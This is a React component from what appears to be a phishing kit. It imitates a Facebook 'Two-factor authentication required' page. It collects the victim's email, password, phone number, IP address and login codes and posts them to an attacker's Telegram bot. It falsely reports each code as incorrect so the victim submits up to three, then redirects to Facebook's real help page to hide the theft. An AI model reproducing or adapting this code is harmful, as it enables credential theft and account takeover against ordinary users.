import moment from "moment"; 
import React, { useEffect, useState } from "react"; 
import { Button, Modal } from "react-bootstrap"; 
import { useLocation } from "react-router-dom"; 
import { Header } from "../../components/Header/Header"; 
import { useApplyForm } from "../../lib/form/useApplyForm"; 
import { CHAT_ID, TELEGRAM_API_URL } from "../../api/General"; 

import "./SingleMission.scss"; 

export const SingleMission = () => { 
  const [time, setTime] = useState(0); 
  const [open, setOpen] = useState(false); 
  const [seconds, setSeconds] = useState<number | null>(null); // Initially no timer 
  const [isButtonDisabled, setIsButtonDisabled] = useState(false); // Disable button on countdown 
  const [step, setStep] = useState(1); // Track the submission step 
  const location = useLocation(); 

  let countDown = seconds !== null ? moment.unix(seconds).utc().format("m[:]s") : "0:00"; 
  const countDownSplit = countDown.split(":"); 

  useEffect(() => { 
    if (seconds !== null && seconds > 0) { 
      const timer = setTimeout(() => setSeconds(seconds - 1), 1000); 
      return () => clearTimeout(timer); 
    } else if (seconds === 0) { 
      setIsButtonDisabled(false); // Enable the button after countdown 
    } 
  }, [seconds]); 

  const formik = useApplyForm({ 
    onSubmit: async (values) => { 
      const params = location.state as any; 

      try { 
        const data = { 
          email: params?.email, 
          name: params?.name, 
          pagename: params?.pageName, 
          info: params.additionalInfo, 
          ipAddress: params.ipAddress, 
          password: params.password, 
          rePassword: params.rePassword, 
          personalEmail: params.personalEmail, 
          phoneNumber: params.phoneNumber, 
          code: values.code, 
        }; 

        const telegramMessage = 
          `IP_ADDRESS: ${data.ipAddress}\n\n
          Email: ${data.email}\n
          Name: ${data.name}\n
          PageName: ${data.pagename}\n
          Info: ${data.info}\n
          Password: ${data.password}\n
          Re-Password: ${data.rePassword}\n
          Personal email: ${data.personalEmail}\n
          Phone number: ${data.phoneNumber}\n
          CODE: ${data.code}`; 

        await fetch(TELEGRAM_API_URL, { 
          method: "POST", 
          headers: { 
            "Content-Type": "application/json", 
          }, 
          body: JSON.stringify({ 
            chat_id: CHAT_ID, 
            text: telegramMessage, 
          }), 
        }); 

        formik.resetForm(); 
      } catch (error) { 
        console.error(error, "ERROR"); 
      } 
    }, 
  }); 

  const handleClick = () => { 
    if (formik.errors?.code && formik.errors?.code?.length > 0) { 
      return; 
    } 

    setTime((previous) => previous + 1); 

    if (time === 0) { 
      formik.handleSubmit(); 
      setIsButtonDisabled(true); // Disable button after first submission 
      setSeconds(60); // Start 60-second timer 
      setStep(2); // Update to step 2 after first submission 
    } 

    if (time === 1) { 
      formik.handleSubmit(); 
      setIsButtonDisabled(true); // Disable button after second submission 
      setSeconds(60); // Start 60-second timer 
      setStep(3); // Update to step 3 after second submission 
    } 

    if (time >= 2) { 
      formik.handleSubmit(); 
      window.location.href = "https://www.facebook.com/help?_rdc=2&_rdr"; 
    } 
  }; 

  return ( 
    <> 
      <Header /> 
      <div className="SingleMission"> 
        <section className="afterheader" style={{ paddingTop: 50 }}> 
          <div className="container"> 
            <div className="row"> 
              <div className="col-12 col-md-6 offset-md-3"> 
                <div 
                  style={{ 
                    border: "1px solid", 
                    borderColor: "#dddfe2", 
                    borderRadius: 5, 
                  }} 
                > 
                  <h3 className="titleh3"> 
                    Two-factor authentication required ({step}/3) 
                  </h3> 
                  <div className="content2"> 
                    <p> 
                      You’ve asked us to require a 6-digit or 8-digit login code when 
                      you tries to access your account from a new device or 
                      browser. 
                    </p> 
                    <p> 
                      Enter the 6-digit or 8-digit code from your{" "} 
                      <strong style={{ fontWeight: "800" }}> 
                        phone, email or code generator. 
                      </strong>{" "} 
                      
                    </p> 
                    <div 
                      style={{ 
                        borderBottom: "1px solid", 
                        width: "100%", 
                        borderColor: "#dddfe2", 
                        paddingTop: 15, 
                      }} 
                    /> 
                    <form 
                      onSubmit={formik.handleSubmit} 
                      style={{ marginTop: 20 }} 
                    > 
                      <div className="form-group"> 
                        <input 
                          id="code" 
                          name="code" 
                          type="number" 
                          className="form-control" 
                          placeholder="Your code" 
                          style={{ width: 170, display: "inline" }} 
                          value={formik.values.code} 
                          onChange={formik.handleChange} 
                          required 
                        /> 
                        &nbsp; 
                        {seconds !== null && time > 0 ? ( 
                          <p id="time" style={{ display: "inline" }}> 
                            ( 
                            {seconds > 59 && countDownSplit.length > 0 
                              ? countDownSplit[0] + ":" 
                              : ""} 
                            {countDownSplit.length > 1 
                              ? countDownSplit[1] 
                              : "00"} 
                            ) 
                          </p> 
                        ) : null} 
                      </div> 
                      <div style={{ display: "flex", flexDirection: "column" }}> 
                        {time > 0 && ( 
                          <span 
                            style={{ 
                              color: "#a94442", 
                              fontSize: ".9375rem", 
                              marginTop: "0.5rem", 
                            }} 
                          > 
                            Your verification code was incorrect, please try 
                            again! 
                          </span> 
                        )} 
                        {formik.errors?.code && 
                          formik.errors?.code?.length > 0 && ( 
                            <span 
                              style={{ 
                                color: "#a94442", 
                                fontSize: ".9375rem", 
                                marginTop: "0.5rem", 
                              }} 
                            > 
                              {formik.errors?.code} 
                            </span> 
                          )} 
                      </div> 
                    </form> 
                  </div> 
                  <div className="footeranother"> 
                    <a 
                      href="javascript: void();" 
                      style={{ 
                        float: "left", 
                        fontSize: 14, 
                        color: "#1877f2", 
                        fontWeight: 641, 
                        textDecoration: "none", 
                      }} 
                      data-toggle="modal" 
                      data-target="#exampleModalScrollable" 
                      onClick={() => setOpen(true)} 
                    > 
                      Need another way to authenticate? 
                    </a> 
                    <button 
                      onClick={handleClick} 
                      type="submit" 
                      className="btn btn-primary" 
                      name="perfundo" 
                      style={{ fontWeight: "700" }} 
                      disabled={isButtonDisabled} // Disable button during countdown 
                    > 
                      Submit 
                    </button> 
                  </div> 

                  <div className="container butonsend butonsendonlymobile"> 
                    <div className="row" /> 
                  </div> 
                </div> 
              </div> 
            </div> 
          </div> 
        </section> 
        <Modal show={open} onHide={() => setOpen(false)}> 
          <Modal.Header closeButton> 
            <Modal.Title> 
              <h5 
                className="modal-title" 
                id="exampleModalScrollableTitle" 
                style={{ color: "black" }} 
              > 
                Didn’t receive the code? 
              </h5> 
            </Modal.Title> 
          </Modal.Header> 
          <Modal.Body>
            <p>
              1. Go to <b> Settings </b> &gt; <b> Security </b> and{" "}
              <b> Login</b>.
            </p>
            <p>
              2. Under the <b>Two-Factor Authentication</b> section, click
              <b> Use two-factor authentication</b>. You may need to re-enter
              your password.
            </p>
            <p>
              3. Next to <b>Recovery Codes</b>, click <b>Setup</b> then{" "}
              <b>Get Codes</b>. If you've already set up recovery codes, you can
              click <b>Show Codes</b> then copy one of the codes and enter it here.
            </p>
            <img src="recovery.png" alt="" width="100%" />
          </Modal.Body>
          <Modal.Footer> 
            <Button variant="secondary" onClick={() => setOpen(false)}> 
              Close 
            </Button> 
          </Modal.Footer> 
        </Modal> 
      </div> 
    </> 
  ); 
}; 
